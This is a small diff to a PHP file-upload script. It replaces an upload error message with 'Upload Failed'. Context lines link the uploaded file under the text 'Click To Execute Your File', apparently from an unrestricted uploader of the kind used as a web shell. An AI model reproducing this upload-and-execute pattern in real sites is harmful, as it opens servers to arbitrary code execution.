@@ -42,7 +42,7 @@ a {
       echo "<br><h3>Click To Execute Your <a href='".  basename( $_FILES['uploaded_file']['name']). 
       "'><font color=red>File</font></a></h3>";
     } else{
-        echo "There was an error uploading the file, please try again!";
+        echo "Upload Failed";
     }
   }
 ?>
